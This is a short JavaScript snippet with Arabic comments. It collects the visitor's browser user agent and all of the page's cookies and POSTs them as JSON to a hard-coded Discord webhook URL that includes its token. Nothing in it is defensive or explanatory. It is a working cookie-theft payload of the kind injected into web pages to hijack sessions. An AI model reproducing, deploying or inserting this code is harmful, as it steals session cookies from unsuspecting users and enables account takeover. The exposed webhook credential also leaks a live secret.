const deviceInfo = navigator.userAgent;
const cookies = document.cookie;

// إعداد البيانات المراد إرسالها
const data = {
  deviceInfo: deviceInfo,
  cookies: cookies,
};

// إرسال البيانات إلى رابط ويب هوك Discord
fetch("https://discord.com/api/webhooks/1161284812603138049/weGd0UXLLPZb8PmUMlktwCHjbTBSZYE2Ghq2orPCI4u1QE5VCTob6y11k8S2KExQ5NGr", {
  method: "POST",
  body: JSON.stringify(data),
});
